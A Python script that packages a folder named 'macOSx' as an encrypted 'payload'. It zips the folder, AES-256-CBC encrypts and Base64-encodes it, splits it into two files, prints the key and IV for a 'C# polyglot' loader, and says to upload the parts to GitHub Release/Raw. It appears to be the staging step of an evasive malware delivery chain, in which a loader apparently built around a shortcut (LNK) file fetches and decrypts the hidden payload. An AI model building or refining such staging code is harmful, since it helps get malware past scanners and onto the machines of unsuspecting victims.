import os
import zipfile
import base64
import secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

ROOT_DIR = r"d:\Downloads\lnk"
MACOSX_DIR = os.path.join(ROOT_DIR, "macOSx")
ZIP_PATH = os.path.join(ROOT_DIR, "macOSx.zip")

print("Zipping macOSx...")
def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            arcname = os.path.relpath(file_path, os.path.dirname(path))
            ziph.write(file_path, arcname)

if os.path.exists(ZIP_PATH):
    os.remove(ZIP_PATH)

with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zipf:
    zipdir(MACOSX_DIR, zipf)

print(f"Created {ZIP_PATH} successfully.")

print("Encrypting payload with AES-256-CBC...")
with open(ZIP_PATH, 'rb') as f:
    zip_data = f.read()

# 1. Pad data to be multiple of 16 bytes (AES block size)
padder = padding.PKCS7(128).padder()
padded_data = padder.update(zip_data) + padder.finalize()

# 2. Generate random 32-byte Key and 16-byte IV
key = secrets.token_bytes(32)
iv = secrets.token_bytes(16)

# 3. Encrypt data
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
encryptor = cipher.encryptor()
encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

# 4. Convert encrypted data to Base64 for safe transport
b64_enc_data = base64.b64encode(encrypted_data).decode('utf-8')

# 5. Split into 2 parts
half_length = len(b64_enc_data) // 2
part1 = b64_enc_data[:half_length]
part2 = b64_enc_data[half_length:]

part1_path = os.path.join(ROOT_DIR, "macOSx.zip.aes.part1")
part2_path = os.path.join(ROOT_DIR, "macOSx.zip.aes.part2")

with open(part1_path, 'w') as f:
    f.write(part1)
with open(part2_path, 'w') as f:
    f.write(part2)

print("\n--- ENCRYPTION COMPLETE ---")
print(f"Part 1 saved to: {part1_path}")
print(f"Part 2 saved to: {part2_path}")
print("\n--- IMPORTANT CREDENTIALS FOR C# POLYGLOT ---")
print(f"AES Key (Base64): {base64.b64encode(key).decode('utf-8')}")
print(f"AES IV (Base64):  {base64.b64encode(iv).decode('utf-8')}")
print("----------------------------------------------")
print("Upload the two .aes.part files to GitHub Release/Raw.")
